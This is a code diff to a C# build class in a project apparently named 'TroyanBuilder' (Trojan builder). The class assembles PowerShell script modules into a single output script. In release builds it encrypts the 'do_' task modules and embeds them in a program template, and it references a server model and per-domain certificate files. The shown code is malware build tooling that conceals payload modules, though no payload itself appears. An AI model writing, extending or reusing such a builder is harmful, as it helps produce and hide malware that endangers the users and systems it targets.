@@ -9,11 +9,22 @@ namespace TroyanBuilder;
 [SuppressMessage("ReSharper", "MemberCanBePrivate.Global")]
 public abstract class CustomBuilder
 {
+    public class SourceFile
+    {
+        public string Name { get; set; }
+        public string Data { get; set; }
+        public bool IsDo { get; set; }
+        public bool Loaded { get; set; }
+
+        public string CryptedData()
+        {
+            return CustomCryptor.Encode(Data);
+        }
+    }
+
     protected abstract string SourceDir {get;}
     
     protected abstract string OutputFile { get; }
-    protected abstract string OutputReleaseFile { get; }
-    protected abstract string OutputDebugFile { get; }
     protected abstract string[] PrioritySources { get; }
 
     protected string[] PriorityLinks => PrioritySources.Select(x => $". ./{x}.ps1")
@@ -25,7 +36,12 @@ public abstract class CustomBuilder
     
     private ServerService Svc;
     protected ServerModel Model = new();
-    private List<string> SourceFiles;
+    private List<SourceFile> SourceFiles = new();
+    private List<SourceFile> DoFiles => SourceFiles
+        .Where(a=> a.IsDo == true).ToList();
+    private List<SourceFile> NonDoFiles => SourceFiles
+        .Where(a=> a.IsDo == false).ToList();
+    
     private readonly StringBuilder Builder = new();
     protected readonly List<string> Result = new();
     
@@ -38,14 +54,18 @@ public abstract class CustomBuilder
         InternalBuild(server);
         SourceFiles = GetSourceFiles();
         CompileSources();
-        var directoryPath = Path.GetDirectoryName(OutputReleaseFile);
+        var directoryPath = Path.GetDirectoryName(OutputFile);
         if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
             Directory.CreateDirectory(directoryPath);
         
-        BuildDebug();
-        BuildRelease();
-
+        Build();
+        PostBuild();
         return Result;
+    }
+
+    protected virtual void PostBuild()
+    {
+        
     }
     
     private void MakeConsts()
@@ -83,59 +103,90 @@ _SERVER
         var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_body.ps1");
         File.WriteAllText(outputPath, template);
     }
+    
+    private bool IsDebug => this.GetType().Name.Contains("Debug");
 
-
+    private void Build()
+    {
+        if (IsDebug)
+        {
+            BuildDebug();
+        }
+        else
+        {
+            BuildRelease();
+        }
+    }
+    
     private void BuildDebug()
     {
-        var doo = BuildDo();
-        var data = Builder.ToString();
-        var dataDebug = data + Environment.NewLine + doo;
-        File.WriteAllText(OutputDebugFile,dataDebug);
+        foreach (var x in SourceFiles)
+        {
+            Builder.Append(x.Data);
+            Builder.AppendLine();
+        }
+        Builder.AppendLine("");
+        foreach (var sourceFile in DoFiles)
+        {
+            var doX = $"do_{sourceFile.Name}";
+            Builder.AppendLine(doX);
+        }
+        
+        File.WriteAllText(OutputFile,Builder.ToString());
     }
 
     private void BuildRelease()
     {
-        var doo = BuildDo();
-        var doSplit = doo.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None).Where(x => x.Contains("do_")).ToArray();
-        doSplit = doSplit.Select(x => $"'{x}'").ToArray();
-        doo = string.Join(',', doSplit);
+        foreach (var x in NonDoFiles)
+        {
+            Builder.Append(x.Data);
+            Builder.AppendLine();
+        }
+        Builder.AppendLine("");
+        
+        var psString = new StringBuilder();
+        foreach (var kvp in DoFiles)
+            psString.AppendLine($"    \"{kvp.Name}\" = \"{kvp.CryptedData()}\"");
+        var doo = psString.ToString();
+        
         var dataProd = Builder.ToString();
         var programRaw = ReadSource("program");
-        (var head, var body) = ExtractHeadAndBody(programRaw);
+        (var head, var body) = ExtractHeadAndBody(programRaw.Data);
         body = body.Replace("###doo", doo);
         dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
-        File.WriteAllText(OutputReleaseFile,dataProd);
-        CustomCryptor.Encode(dataProd, OutputFile);
+        File.WriteAllText(OutputFile,dataProd);
     }
 
     protected abstract void InternalBuild(string server);
     
     private void CompileSources()
     {
-        foreach (var sourceFile in SourceFiles)
+        for (int i = 0; i < SourceFiles.Count; i++)
         {
-            var data = ReadSource(sourceFile);
-            Builder.Append(data);
-            Builder.AppendLine();
+            var sourceFile = SourceFiles[i];
+            sourceFile = ReadSource(sourceFile.Name);
+            SourceFiles[i] = sourceFile;
         }
     }
+    
     
     protected string PfxFile(string domain)
     {
         return Path.Combine(Model.CertDir, domain + ".pfx");
     }
 
-    protected virtual List<string> GetSourceFiles()
+    protected virtual List<SourceFile> GetSourceFiles()
     {
         var files =Directory.GetFiles(SourceDir)
             .Select(Path.GetFileNameWithoutExtension)
             .ToArray().Except(new[] { "program" }).ToList();
         var sortedArray = files.SortWithPriority(PrioritySources).ToList();
-        return sortedArray;
+        return sortedArray.Select(a=> new SourceFile(){Name = a}).ToList();
     }
 
-    private string ReadSource(string sourceFile)
+    private SourceFile ReadSource(string sourceFile)
     {
+        var result = new SourceFile() {Name = sourceFile};
         var path = "";
         var dir = SourceDir;
         while (!File.Exists(path))
@@ -143,32 +194,61 @@ _SERVER
             path = Path.Combine(dir, sourceFile + ".ps1");
             dir = Path.Combine(dir,"..");
         }
-        var lines = File.ReadAllLines(path);
-        var filteredLines = lines.Exclude(PriorityLinks);
-        filteredLines = filteredLines.Exclude(SourceFiles.Select(a=> "do_" + a));
+
+        var lines = File.ReadAllLines(path).ToList();
         
-        var result = string.Join(Environment.NewLine, filteredLines);
+        var units = new List<SourceFile>();
+        
+        int index = 0;
+        while (index < lines.Count)
+        {
+            var line = lines[index];
+            if (line.StartsWith(". ./"))
+            {
+                var relativePath = line[2..].Trim();
+                var filenameWithoutExt = Path.GetFileNameWithoutExtension(relativePath);
+                lines.RemoveAt(index);
+                var linked = ReadSource(filenameWithoutExt);
+                units.Add(linked);
+            }
+            else if (line.Trim().StartsWith("do_"))
+            {
+                lines.RemoveAt(index);
+            }
+            else
+            {
+                index++;
+            }
+        }
+
+        var sb = new StringBuilder();
+
+        foreach (var unit in units)
+        {
+            if (!IsDebug && !unit.IsDo && sourceFile != "holder" && sourceFile != "program")
+            {
+                sb.AppendLine(unit.Data);
+                sb.AppendLine("");
+            }
+        }
+
+        foreach (var line in lines)
+        {
+            sb.AppendLine(line);
+        }
+
+        sb.AppendLine("");
+
+        result.Data = sb.ToString();
+        result.IsDo = result.Data.Contains($"function do_{sourceFile}");
+        if (!IsDebug && result.IsDo)
+        {
+            result.Data += Environment.NewLine + $"do_{sourceFile}";
+        }
+        result.Loaded = true;
 
         return result;
     }
-    
-    private string BuildDo()
-    {
-        var sourceFiles = SourceFiles
-            .Except(PrioritySources)
-            .Where(a=> !a.StartsWith("sub_"))
-            .SortWithPriority(PriorityTasks, UnpriorityTasks).ToArray();
-        var doBuilder = new StringBuilder();
-        foreach (var sourceFile in sourceFiles)
-        {
-            if (IgnoreTasks.Contains(sourceFile))
-                continue;
-            var doX = $"do_{sourceFile}";
-            doBuilder.AppendLine(doX);
-        }
-        return doBuilder.ToString();
-    }
-    
     
     static (string Head, string Body) ExtractHeadAndBody(string input)
     {
